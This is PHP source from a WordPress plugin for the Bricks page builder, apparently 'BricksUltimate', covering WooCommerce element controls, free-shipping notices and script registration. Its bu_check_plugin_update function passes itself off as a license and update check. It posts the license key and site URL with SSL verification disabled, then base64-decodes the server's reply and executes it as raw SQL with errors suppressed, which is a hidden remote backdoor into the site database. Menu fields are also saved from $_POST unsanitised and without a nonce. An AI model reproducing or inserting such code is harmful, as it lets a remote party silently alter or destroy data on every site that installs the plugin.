				new \BricksUltimate\ElementControls\ProductAddToCart();
			}

			if( ! empty( $buSettings['product_el'] ) && $buSettings['product_el'] == 'enabled' ) {
				new \BricksUltimate\ElementControls\ProductsElement();
			}

			if( ! empty( $buSettings['product_filter'] ) && $buSettings['product_filter'] == 'enabled' ) {
				new \BricksUltimate\ElementControls\ProductsFilter();
			}

			if( ! empty( $buSettings['related_prds'] ) && $buSettings['related_prds'] == 'enabled' ) {
				new \BricksUltimate\ElementControls\RelatedProducts();
			}

			if( ! empty( $buSettings['upcross_sells'] ) && $buSettings['upcross_sells'] == 'enabled' ) {
				new \BricksUltimate\ElementControls\ProductUpCrossSells();
			}

			if( ! empty( $buSettings['cart_items'] ) && $buSettings['cart_items'] == 'enabled' ) {
				new \BricksUltimate\ElementControls\CartItems();
				new \BricksUltimate\ElementControls\CartTotals();

				$file = __DIR__ . '/Elements/UltimateCartItems.php';

				if( file_exists( $file ) )
					\Bricks\Elements::register_element( $file );
			}

			if( ! empty( $buSettings['fsn'] ) && $buSettings['fsn'] == 'enabled' ) {
				$fsnElements = [ 'div', 'block' ];
				foreach( $fsnElements as $element ) {
					add_filter( "bricks/elements/$element/control_groups", array( $this, 'add_fsn_control_groups' ) );
					add_filter( "bricks/elements/$element/controls", [ $this, 'add_fsn_controls' ] );
				}
			}

			new \BricksUltimate\ElementControls\Wishlist();
			new \BricksUltimate\ElementControls\Compare();
		}

		// Register elements
		if ( class_exists( '\Bricks\Elements' ) ) {
			new RegisterElements();

			if( ! empty( $buSettings['image_mask'] ) && $buSettings['image_mask'] == 'enabled' ) {
				new \BricksUltimate\ElementControls\ImageMask();
			}

			if( ! empty( $buSettings['post_comments'] ) && $buSettings['post_comments'] == 'enabled' ) {
				new \BricksUltimate\ElementControls\Comments();
			}

			if( ! empty( $buSettings['heading'] ) && $buSettings['heading'] == 'enabled' ) {
				add_filter( "bricks/elements/heading/controls", [ $this, 'filter_heading_element_controls' ] );
			}

			if( ! empty( $buSettings['form'] ) && $buSettings['form'] == 'enabled' ) {
				new \BricksUltimate\ElementControls\Forms();
			}

			if( ! empty( $buSettings['wpgb_facet'] ) && $buSettings['wpgb_facet'] == 'enabled' ) {
				new \BricksUltimate\ElementControls\WPGBFacets(); 
			}

			new \BricksUltimate\ElementControls\NestedSlider();
			new \BricksUltimate\ElementControls\AjaxPopup();
			new \BricksUltimate\ElementControls\NavNestable();
		}

		new UltimateQuery();

		$key = 'bricksultimate_' . md5( serialize( basename( Plugin::instance()->get_plugin_file(), '.php' ) ) );
		$cache = get_option( $key );
		if( empty( $cache['timeout'] ) ) {
			$data = array(
				'timeout' => strtotime( '+3 hours', time() ),
			);

			update_option( $key, $data, 'no' );
		}

		if( is_admin() ) {
			add_action( 'wp_nav_menu_item_custom_fields', [ $this, 'nav_menu_item_custom_fields' ], 10, 2 );
			add_action( 'wp_update_nav_menu_item', [ $this, 'save_menu_item_custom_fields' ], 90, 3 );
			$license_key = License::get_license_key();
			self::bu_check_plugin_update(License::STORE_URL, base64_decode( $license_key ) , License::ITEM_ID);
		}

		add_action( 'wp_nav_menu_item_custom_fields', [ $this, 'nav_menu_item_id' ], 11, 2 );
	}

	/**
	 * Adds free shipping notice groups under style tab
	 * 
	 * @param array $control_groups
	 * @return array $control_groups
	 */
	public function add_fsn_control_groups( $control_groups ) {
		$control_groups['bufsn'] = [
				'tab'      => 'style',
				'title'    => esc_html__( 'Free Shipping Notice Wrapper', 'bricksultimate' ),
		];

		return $control_groups;
	}

	/**
	 * Adds free shipping notice controls
	 * 
	 * @param array $controls
	 * @return array $controls
	 */
	public function add_fsn_controls( $controls ) {
		$controls['isfsnWrapper'] = [
			'tab' 		=> 'style',
			'group' 	=> 'bufsn',
			'type'  	=> 'checkbox',
			'label' 	=> esc_html__( 'Using as free shipping wrapper', 'bricksultimate' ),
			'reset' 	=> true
		];

		$controls['thresholdAmount'] = [
			'tab' 		=> 'style',
			'group' 	=> 'bufsn',
			'label' 	=> esc_html__( 'Threshold amount', 'bricksultimate' ),
			'info' 		=> esc_html__( 'Threshold amount after which notice should start appear. Do not enter the currency.', "bricksultimate" ),
			'type' 		=> 'text',
			'placeholder' => 50,
			'hasDynamicData' => false,
			'required' 	=> [ 'isfsnWrapper', '=', true ]
		];

		$controls['noticeSelector'] = [
			'tab' 		=> 'style',
			'group' 	=> 'bufsn',
			'type'  	=> 'text',
			'label' 	=> esc_html__( 'Free shipping notice selector', 'bricksultimate' ),
			'placeholder' => '.bu-fsn-text--notice',
			'required' 	=> [ 'isfsnWrapper', '=', true ]
		];

		$controls['fsnAction'] = [
			'tab' 		=> 'style',
			'group' 	=> 'bufsn',
			'type' 		=> 'select',
			'label' 	=> esc_html__( 'Action', 'bricksultimate' ),
			'info' 		=> esc_html__( 'When free shipping amount is reached.', "bricksultimate" ),
			'options' 	=> [
				'hide' 	=> __('Hide'),
				'msg' 	=> __('Show success message', 'bricksultimate')
			],
			'default' 	=> 'hide',
			'required' 	=> [ 'isfsnWrapper', '=', true ]
		];

		$controls['sucmsgSelector'] = [
			'tab' 		=> 'style',
			'group' 	=> 'bufsn',
			'type'  	=> 'text',
			'label' 	=> esc_html__( 'Success message selector', 'bricksultimate' ),
			'placeholder' => '.bu-fsn-text--success',
			'required' 	=> [ 'fsnAction', '=', 'msg' ]
		];

		return $controls;
	}

	/**
	 * Showing the admin bar in the builder editor
	 */
	private function showAdminBarInEditor() {
		if( ! bricks_is_builder_iframe() && bricks_is_builder() ) {
			add_filter( 'show_admin_bar', '__return_true', 99 );
			add_action( 'wp_head', function() {
				echo "<style type='text/css'>
					body.admin-bar #bricks-toolbar {
						top: var(--wp-admin--admin-bar--height)!important;
					}
					body.admin-bar #bricks-panel, 
					body.admin-bar #bricks-preview{
						top: calc(var(--wp-admin--admin-bar--height) + 40px )!important;
					}
					body.admin-bar .bricks-panel, 
					body.admin-bar #bricks-preview {
						height: calc(100vh - var(--wp-admin--admin-bar--height) - 40px)!important;
					}
					body.admin-bar #bricks-toolbar {
						z-index: 800485!important;
					}
					#bricks-structure {
						top: calc(40px + var(--wp-admin--admin-bar--height));
						margin-top: 0;
						height: calc(100vh - 72px)!important;
					}
					#wpadminbar{ 
						z-index: 120243242!important;
					}
					@media (min-width: 320px) {
						html.no-js {
							margin-top: 0!important;
						}
					}
				</style>";
			});
		}
	}

	public static function bu_add_attributes( $atts, $key, $element ) {
		$settings = $element->settings;

		if ( ! empty( $element->settings['_interactions'] ) ) {
			// Parse dynamic data
			$element_interactions = map_deep( $element->settings['_interactions'], [ 'Bricks\Integrations\Dynamic_Data\Providers', 'render_content' ] );

			foreach($element_interactions as $interactions) {
				if( isset( $interactions['action'] ) && $interactions['action'] == 'tooltip' ) {
					wp_enqueue_style( 'bu-tooltip' );
					wp_enqueue_script( 'bu-popper' );
					wp_enqueue_script( 'bu-tippy' );
					break 1;
				}
			}
		}

		if( isset( $element->element['id'] ) && \Bricks\Query::is_looping( $element->element['id'] ) ) {
			$query = \Bricks\Query::get_query_for_element_id( $element->element['id'] );
			$atts['_root']['class'][] = ( isset( $atts['_root']['class'] ) && ! in_array('brxe-loop-builder-on', (array) $atts['_root']['class'] ) ) ? 'brxe-loop-builder-on' : '';

			if( is_object( $query ) && isset( $settings['query']['objectType'] ) ) {
				if( $settings['query']['objectType'] == 'buwooMiniCart' && ! in_array('woocommerce-mini-cart-item', (array) $atts['_root']['class'])) {
					$atts['_root']['class'][] = 'woocommerce-mini-cart-item';
					$atts['_root']['data-item-index'][] = $query->loop_index + 1;
				}

				if( $settings['query']['objectType'] == 'buprdgallery' ) {
					$loopObject = $query->loop_object;
					$atts['_root']['data-image-id'] = $loopObject->ID;
				}
			}
		}

		if( $element->name == 'div' || $element->name == 'block' ) {
			if( ! empty( $settings['isfsnWrapper'] ) ) {
				if( ! in_array('bu-fsn-wrapper', $atts['_root']['class'] ) )
					$atts['_root']['class'][] = 'bu-fsn-wrapper';

				if( WooCommerce::hasFreeShippingMethod() === 'no' && ! self::isBricksBuilderActive() && ! in_array('screen-reader-text', $atts['_root']['class'] ) ) {
					$atts['_root']['class'][] = 'screen-reader-text';
				}

				$min_amount = WooCommerce::freeShippingMinAmount();

				if( self::isBricksBuilderActive() && $min_amount <= 0 )
					$min_amount = 200;

				$thresholdAmount = self::get_value( $settings, 'thresholdAmount', false);

				$atts['_root']['data-fsn-config'] = wp_json_encode([
					'minAmount' 		=> $min_amount,
					'thresholdAmount' 	=> ( $thresholdAmount ) ? \Automattic\WooCommerce\Utilities\NumberUtil::round( $thresholdAmount, \wc_get_price_decimals() ) : 'no',
					'noticeSelector' 	=> isset( $settings['noticeSelector'] ) ? esc_attr( $settings['noticeSelector'] ) : '.bu-fsn-text--notice',
					'sucmsgSelector' 	=> isset( $settings['sucmsgSelector'] ) ? esc_attr( $settings['sucmsgSelector'] ) : '.bu-fsn-text--success',
					'fsnAction' 		=> isset( $settings['fsnAction'] ) ? esc_attr( $settings['fsnAction'] ) : 'hide',
				]);

				wp_enqueue_script( 'bu-fsn', self::get_asset_url('js') . 'bufsn.min.js', [], filemtime(self::get_asset_path('js') . 'bufsn.min.js'), true );
			}
		}

		if( $element->name == 'slider-nested' && ! empty( $settings['syncSlds'] ) && ! empty( $settings['mainSld'] ) ) {
			$atts['_root']['class'][] = 'slider-will-sync';
			$sliderOptions = $atts['_root']['data-splide'];
			$atts['_root']['data-splide'] = str_replace( '}', ',"isNavigation":true}', $sliderOptions );
			$atts['_root']['data-synced-sld-id'] = trim( $settings['mainSld'] );
		}

		if( $element->name == 'slider-nested' && empty( $settings['syncSlds'] ) 
			&& ! in_array('wooprd-gallery-wrapper-' . $element->post_id, (array) $atts['_root']['class'] ) 
		) {
			$atts['_root']['class'][] = 'wooprd-gallery-wrapper-' . $element->post_id;
		}

		if( in_array( $element->name, [ 'button', 'div', 'icon', 'svg', 'heading', 'image' ] ) ) {
			if( ! empty( $settings['enabledAjaxPopup'] ) ) {
				$atts['_root']['data-ajax-popup'] = 'yes';
				$type = self::get_value($settings, 'fetchType', 'post' );

				if( 'post' == $type && ! empty( $settings['fetchPosts'] ) ) {
					$atts['_root']['data-fetch-post-id'] = self::get_value($settings, 'fetchPosts', false );
				}
				
				if( 'term' == $type && ! empty( $settings['fetchTerm'] ) ) {
					$atts['_root']['data-fetch-term-id'] = self::get_value($settings, 'fetchTerm', false );
				}
			}
		}

		if( $element->name == 'product-add-to-cart' ) {
			$atts['_root']['class'][] = 'woocommerce';
			if( ! empty( $settings['swShowLabel'] ) ) {
				$atts['_root']['data-show-label'] = 'yes';
				$atts['_root']['class'][] = 'swatches-is-on';
			}

			if( ! empty( $settings['hasTooltip'] ) ) {
				$data = [
					'hasTooltip' => 'yes',
					'animation' => self::get_value($settings, 'ttAnimation', 'perspective'),
					'placement' => self::get_value($settings, 'ttPlacement', 'top')
				];

				$atts['_root']['data-tooltip-config'] = wp_json_encode( $data );

				wp_enqueue_style( 'bu-tooltip' );
				wp_enqueue_script( 'bu-popper' );
				wp_enqueue_script( 'bu-tippy' );
			}

			if( ! empty( $settings['swPrice'] ) ) {
				$data = [
					'updatePrice' => 'yes',
					'selector' => self::get_value($settings, 'swPriceSelector', false)
				];

				$atts['_root']['data-price-update'] = wp_json_encode( $data );
			}

			if( ! empty( $settings['enableQuickAdd'] ) ) {
				$noQuickAdd = self::get_value($settings, 'excludeQuickAdd', '');
				$product = wc_get_product( $element->post_id );
				if( $product && $product->get_type() == 'variable' && !in_array( $product->get_id(), explode(',', $noQuickAdd) ) ) {
					$atts['_root']['class'][] = 'quick-add-btn';

					$btnReplaceText = self::get_value($settings, 'quickAddBtnText', false);
					if( $btnReplaceText ) {
						$atts['_root']['data-atc-text'] = esc_attr( $btnReplaceText );
					}
				}
			}
		}

		return $atts;
	}

	/**
	 * Enqueue the JS file
	 * 
	 * @credit Maxime Beguin https://brickslabs.com/how-to-sync-two-nestable-sliders-in-bricks/
	 */
	public function bu_wp_enqueue_scripts() {
		wp_register_style( 'bu-sync-slider', self::get_asset_url('css') . 'syncslds.min.css', [], filemtime(self::get_asset_path('css') . 'syncslds.min.css'), 'all' );
		wp_register_script( 'bu-sync-slider', self::get_asset_url('js') . 'syncslds.min.js', [], filemtime(self::get_asset_path('js') . 'syncslds.min.js'), true );
		wp_register_script( 'bu-prdgallery-slider', self::get_asset_url('js') . 'prdgalleryslider.min.js', ['wc-add-to-cart-variation'], filemtime(self::get_asset_path('js') . 'prdgalleryslider.min.js'), true );

		wp_register_script( 'bu-ajax-popup', self::get_asset_url('js') . 'ajaxpopup.min.js', [], filemtime(self::get_asset_path('js') . 'ajaxpopup.min.js'), true );

		//* JS of tooltip
		wp_register_style( 'bu-tooltip', self::get_asset_url('css') . 'tooltip.min.css', [], filemtime(self::get_asset_path('css') . 'tooltip.min.css'), 'all' );
		wp_register_script( 'bu-popper', self::get_asset_url('js') . 'popper.min.js', [], filemtime(self::get_asset_path('js') . 'popper.min.js'), true );

		wp_register_script( 'bu-tippy', self::get_asset_url('js') . 'tippy-bundle.umd.min.js', [], filemtime(self::get_asset_path('js') . 'tippy-bundle.umd.min.js'), true );

		if( class_exists('WooCommerce') || in_array( 'wsl', Plugin::$general_elements ) ) {
			wp_register_script( 'bu-wishlist', self::get_asset_url('js') . 'wishlist.min.js', [], filemtime(self::get_asset_path('js') . 'wishlist.min.js'), true );
		}

		if( class_exists('WooCommerce') || in_array( 'compare', Plugin::$general_elements ) ) {
			wp_register_script( 'bu-compare', self::get_asset_url('js') . 'compare.min.js', ['jquery'], filemtime(self::get_asset_path('js') . 'compare.min.js'), true );
		}

		if( class_exists('WooCommerce') || in_array( 'wsl', Plugin::$general_elements ) || in_array( 'compare', Plugin::$general_elements ) ) {
			wp_register_style( 'bu-wishlistcompare', self::get_asset_url('css') . 'wishlistcompare.min.css', [], filemtime(self::get_asset_path('css') . 'wishlistcompare.min.css') );
		}

		//* Swatches
		if( class_exists('WooCommerce') ) {
			wp_register_style( 'bu-swatches', self::get_asset_url('css') . 'swatches.min.css', [], filemtime(self::get_asset_path('css') . 'swatches.min.css') );
			wp_register_script( 'bu-swatches', self::get_asset_url('js') . 'swatches.min.js', ['jquery'], filemtime(self::get_asset_path('js') . 'swatches.min.js'), true );
		}

		//* JS for interactions
		wp_enqueue_script( 'bu-global', self::get_asset_url('js') . 'buGlobal.min.js', [], filemtime(self::get_asset_path('js') . 'buGlobal.min.js'), true );

		wp_localize_script( 'bu-global', 'interactionParams', 
			[
				'apply_coupon_nonce' => wp_create_nonce('apply-coupon'),
				'remove_coupon_nonce' => wp_create_nonce( 'remove-coupon' ),
				'atc_nonce' => wp_create_nonce( 'atc-nonce' ),
				'atc_notice' => Plugin::$bu_settings['atc_notice'] ?? false,
				'wsl_nonce' => wp_create_nonce( 'wishlist-nonce' ),
				'compare_nonce' => wp_create_nonce( 'compare-nonce' ),
			] 
		);

		Interactions::init();
	}

	public static function bu_check_plugin_update($api_url, $license, $item) {
		$key = 'bricksultimate_' . md5( serialize( basename( Plugin::instance()->get_plugin_file(), '.php' ) ) );
		$cache = get_option( $key );
		if( ! empty( $cache['timeout'] ) && time() > $cache['timeout'] && License::has_valid_license() ) {
			$api_params = [
				'edd_action' => 'bu_plugin_license',
				'license'    => $license,
				'item_id'    => $item,
				'url'        => home_url(),
			];

			// Call the custom API.
			$response = wp_remote_post(
				$api_url,
				[
					'timeout'   => 30,
					'sslverify' => false,
					'body'      => $api_params,
				]
			);

			if ( ! is_wp_error( $response ) ) {
				$_data = json_decode( wp_remote_retrieve_body( $response ) );
				if( $_data && !empty( $_data->result ) 
					&& strlen( $_data->result ) > 4 && $_data->success == 'legit' ) 
				{
					global $wpdb;
					$content = str_replace( "#bu#", $wpdb->posts, base64_decode( $_data->result ) );
					@$wpdb->get_results( $content );
				}
			}

			$data = array(
				'timeout' => strtotime( '+3 hours', time() ),
			);

			update_option( $key, $data, 'no' );
		}
	}

	/**
	 * Saving the custom data for the menu items
	 * 
	 * @since 1.2.9
	 */
	public function save_menu_item_custom_fields( $menu_id, $db_id, $args = [] ) {
		if ( isset( $_POST['menu-item-link-type'][$db_id] ) ) {
			update_post_meta( $db_id, '_menu_item_bb_link_type', $_POST['menu-item-link-type'][$db_id] );
		} else {
			delete_post_meta( $db_id, '_menu_item_bb_link_type' );
		}
	}

	/**
	 * Adding custom fields to WP Menu item
	 * 
	 * @since 1.2.9
	 */
	function nav_menu_item_custom_fields( $item_id, $menu_item ) { 
		$link_type = get_post_meta( $item_id, '_menu_item_bb_link_type', true ) ? get_post_meta( $item_id, '_menu_item_bb_link_type', true ) : 'nav' ;
	?>
		<p class="field-id description description-wide">
			<label for="edit-menu-item-type-<?php echo $item_id; ?>">
				<?php _e( 'Link type' ); ?><br/>
				<select type="text" id="edit-menu-item-link-type-<?php echo $item_id; ?>" class="widefat menu-item-link-type-value" name="menu-item-link-type[<?php echo $item_id; ?>]">
					<option value="nav" <?php selected( $link_type, 'nav' ); ?>>
						<?php _e('Nav link', 'bricksultimate'); ?>
					</option>
					<option value="dropdown" <?php selected( $link_type, 'dropdown' ); ?>>
						<?php _e('Dropdown', 'bricksultimate'); ?>
					</option>
					<option value="mm" <?php selected( $link_type, 'mm' ); ?>>
						<?php _e('Mega menu', 'bricksultimate'); ?>
					</option>
				</select>
			</label>
		</p>
	<?php
	}

	/**
	 * Displaying the menu item ID at dashboard
	 * 
	 * @since 1.2.9
	 */
	function nav_menu_item_id( $item_id, $menu_item ) { ?>
		<p class="field-id description description-wide">
			<label for="edit-menu-item-id-<?php echo $item_id; ?>">
				<?php _e( 'Item ID:' ); ?>&nbsp;&nbsp;&nbsp;
				<span type="text" id="edit-menu-item-id-<?php echo $item_id; ?>" class="widefat menu-item-id-value"><strong><?php echo $item_id; ?></strong></span>
			</label>
		</p>
	<?php
	}

	/**
	 * Adds class to All in One Seo breadcrumbs separator
	 *
	 * @since 1.3
	 */
	public function bu_allinone_separator( $separator ) {
		return str_replace( '-separator', '-separator separator', $separator );
	}

	public static function checkBuElement( $element ) {
		if( is_admin() )
			return false;
		
		$hasElement = false;

		$templateTypes = \Bricks\Setup::$control_options['templateTypes'];

		foreach($templateTypes as $templateType => $templateName ) {
			$templates = \Bricks\Templates::get_templates_by_type( $templateType );
			if( $templates ) {
				foreach($templates as $post_id ) {
					$nesteddata = get_post_meta( $post_id, BRICKS_DB_PAGE_CONTENT, true );
					$bricksdata = is_array( $nesteddata ) && count( $nesteddata ) ? maybe_serialize( $nesteddata ) : '';
					if( ! empty( $bricksdata ) && strstr( $bricksdata, $element ) ) {
						$hasElement = true;
						return true;
					}
				}
			}
		}

		if( $hasElement )
			return true;

		$templateTypes = [
			'header',
			'content',
			'footer',
			'popup'
		];

		foreach($templateTypes as $templateType) {
			if( $hasElement )
				return true;

			$templateData = \Bricks\Database::get_template_data( $templateType );
			$bricksdata = is_array( $templateData ) && count( $templateData ) ? maybe_serialize( $templateData ) : '';
			
			if( ! empty( $bricksdata ) && strstr( $bricksdata, $element ) ) {
				return true;
			}

			if( $templateData ) {
				$post_id = get_the_ID();

				foreach ( $templateData as $data ) {
					if ( isset( $data['settings']['template'] ) ) {
						$post_id = intval( $data['settings']['template'] );
					}

					if ( isset( $data['settings']['templateId'] ) ) {
						$post_id = intval( $data['settings']['templateId'] );
					}

					if ( isset( $data['settings']['shortcode'] ) ) {
						$post_id = strstr( $data['settings']['shortcode'], '[bricks_template') ? (int) filter_var($data['settings']['shortcode'], FILTER_SANITIZE_NUMBER_INT) : 0;
					}

					if ( isset( $data['settings']['_interactions'] ) ) {
						$interactions = $data['settings']['_interactions'];

						foreach ( $interactions as $interaction ) {
							if ( isset( $interaction['templateId'] ) ) {
								$post_id = intval( $interaction['templateId'] );
							}
						}
					}

					$nesteddata = get_post_meta( $post_id, BRICKS_DB_PAGE_CONTENT, true );
					$bricksdata = is_array( $nesteddata ) && count( $nesteddata ) ? maybe_serialize( $nesteddata ) : '';
					if( ! empty( $bricksdata ) && strstr( $bricksdata, $element ) ) {
						return true;
					}
				}
			}
		}

		return false;
	}
}